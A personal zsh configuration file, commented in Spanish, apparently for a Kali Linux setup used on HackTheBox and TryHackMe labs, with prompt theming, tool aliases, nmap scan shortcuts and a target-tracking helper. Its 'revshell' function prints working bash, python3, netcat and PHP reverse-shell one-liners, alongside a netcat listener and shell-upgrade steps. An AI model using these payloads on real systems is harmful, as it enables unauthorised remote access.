# ─── Powerlevel10k instant prompt ────────────────────────────────────────────
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
    source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="powerlevel10k/powerlevel10k"

plugins=(
    git
    zsh-autosuggestions
    zsh-syntax-highlighting
    zsh-history-substring-search
    sudo
    web-search
    copypath
    dirhistory
)

source "$ZSH/oh-my-zsh.sh"

# ─── Variables de entorno ─────────────────────────────────────────────────────
export EDITOR="nvim"
export VISUAL="nvim"
export TERM="xterm-256color"
export PATH="$HOME/.local/bin:$HOME/scripts:/opt/nvim-linux-x86_64/bin:$PATH"
HISTSIZE=10000; SAVEHIST=10000; HISTFILE="$HOME/.zsh_history"
setopt HIST_IGNORE_DUPS HIST_IGNORE_SPACE SHARE_HISTORY

# ─── bat / batcat fix ─────────────────────────────────────────────────────────
# En Kali bat se llama batcat — creamos el alias correcto
if command -v batcat &>/dev/null; then
    alias bat='batcat'
    alias cat='batcat --style=auto --pager=never'
    alias catp='batcat --style=full'
elif command -v bat &>/dev/null; then
    alias cat='bat --style=auto --pager=never'
    alias catp='bat --style=full'
fi

# ─── fd fix ───────────────────────────────────────────────────────────────────
if command -v fdfind &>/dev/null && ! command -v fd &>/dev/null; then
    alias fd='fdfind'
fi

# ─── Aliases generales ────────────────────────────────────────────────────────
alias ls='eza --icons --color=always'
alias ll='eza -la --icons --color=always --group-directories-first'
alias la='eza -a --icons --color=always'
alias lt='eza --tree --icons --color=always --level=2'
alias find='fd'
alias grep='rg'
alias diff='diff --color=auto'
alias ip='ip --color=auto'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias mkdir='mkdir -pv'
alias reload='source ~/.zshrc'

# vim → nvim
alias vim='nvim'
alias vi='nvim'
alias v='nvim'

# ─── Aliases hacking ─────────────────────────────────────────────────────────
alias myip='curl -s ifconfig.me && echo'
alias vpnip="ip -4 a show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo 'no vpn'"
alias localip="hostname -I | awk '{print \$1}'"
alias ports='ss -tulpn'
alias listening='ss -tulpn | grep LISTEN'
alias www='python3 -m http.server 80'
alias www8='python3 -m http.server 8000'
alias smb='sudo impacket-smbserver share . -smb2support'
alias msfstart='sudo service postgresql start && msfconsole'
alias b64d='base64 -d'
alias b64e='base64 -w 0'
alias urld='python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.argv[1]))"'
alias urle='python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))"'
alias nse='ls /usr/share/nmap/scripts | grep'
alias scanfast='nmap -T4 -F --open'
alias scanfull='sudo nmap -sV -sC -p- --open -T4'
alias scanudp='sudo nmap -sU -T4 --open'
alias st='settarget'
alias ct='cleartarget'

# ─── Target HTB/THM ───────────────────────────────────────────────────────────
TARGET_FILE="$HOME/.config/polybar/scripts/target"

settarget() {
    if [[ $# -eq 0 ]]; then
        echo "Uso: settarget <IP> [NOMBRE]"
        echo "     settarget 10.10.10.1"
        echo "     settarget 10.10.10.1 NombreMaquina"
        return 1
    elif [[ $# -eq 1 ]]; then
        echo "$1" > "$TARGET_FILE"
        export TARGET="$1"
        echo "[+] Target → $1"
    elif [[ $# -eq 2 ]]; then
        echo "$1 $2" > "$TARGET_FILE"
        export TARGET="$1"
        echo "[+] Target → $1  ($2)"
    else
        echo "[-] Demasiados argumentos"
        return 1
    fi
}

cleartarget() {
    > "$TARGET_FILE"
    unset TARGET
    echo "[*] Target limpiado"
}

target() {
    if [[ -s "$TARGET_FILE" ]]; then
        local ip name
        ip=$(awk '{print $1}' "$TARGET_FILE")
        name=$(awk '{print $2}' "$TARGET_FILE")
        echo "TARGET: $ip ${name:+(${name})}"
        export TARGET="$ip"
    else
        echo "TARGET: no definido  (usa: settarget <ip> [nombre])"
    fi
}

[[ -s "$TARGET_FILE" ]] && export TARGET=$(awk '{print $1}' "$TARGET_FILE")

# ─── Funciones hacking ────────────────────────────────────────────────────────
mkhtb() {
    local name="${1:?Uso: mkhtb <nombre>}"
    local base="$HOME/htb/$name"
    mkdir -p "$base"/{nmap,exploits,loot,www,notes}
    cat > "$base/notes/notes.md" << EOF
# $name

## Info
- IP:
- OS:
- Dificultad:

## Puertos

## Foothold

## Escalada de privilegios

## Flags
- user.txt:
- root.txt:
EOF
    echo "[+] Workspace: $base"
    cd "$base"
}

mktb() {
    local name="${1:?Uso: mktb <nombre>}"
    mkdir -p "$HOME/thm/$name"/{nmap,exploits,loot,www,notes}
    echo "[+] Workspace: $HOME/thm/$name"
    cd "$HOME/thm/$name"
}

nmapscan() {
    local ip="${1:-$TARGET}"
    [[ -z "$ip" ]] && ip=$(awk '{print $1}' "$TARGET_FILE" 2>/dev/null)
    [[ -z "$ip" ]] && { echo "[-] Usa: nmapscan <ip> o settarget <ip>"; return 1; }
    mkdir -p nmap
    echo "[*] Escaneando $ip..."
    sudo nmap -sV -sC -oA nmap/initial "$ip"
    echo "[*] Escaneo completo..."
    sudo nmap -p- --open -T4 -oA nmap/allports "$ip"
}

revshell() {
    local lhost="${1:-$(vpnip 2>/dev/null)}"
    local lport="${2:-4444}"
    echo ""
    echo "─── Reverse Shells → $lhost:$lport ───"
    echo "[bash]    bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo "[python3] python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "[nc]      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $lhost $lport >/tmp/f"
    echo "[php]     php -r '\$s=fsockopen(\"$lhost\",$lport);\$p=proc_open(\"bash\",array(0=>\$s,1=>\$s,2=>\$s),\$pi);'"
}

listen() {
    echo "[*] Escuchando en :${1:-4444}"
    nc -lvnp "${1:-4444}"
}

shell_upgrade() {
    echo "[*] Ejecuta en la shell remota:"
    echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "# Ctrl+Z"
    echo "stty raw -echo; fg"
    echo "export TERM=xterm-256color"
    echo "stty rows \$(tput lines) cols \$(tput cols)"
}

# ─── FZF ─────────────────────────────────────────────────────────────────────
[[ -f ~/.fzf.zsh ]] && source ~/.fzf.zsh
export FZF_DEFAULT_OPTS="
    --color=fg:#c0caf5,bg:#0D0D0D,hl:#63CC00
    --color=fg+:#c0caf5,bg+:#1a1a2e,hl+:#00CC69
    --color=info:#6900CC,prompt:#CC0063,pointer:#63CC00
    --color=marker:#00CC04,spinner:#00CC69,header:#7aa2f7
    --border rounded --prompt '  ' --pointer ' '"

export FZF_DEFAULT_COMMAND="fdfind --type f --hidden --follow --exclude .git 2>/dev/null || find . -type f"

# ─── Powerlevel10k ────────────────────────────────────────────────────────────
[[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh

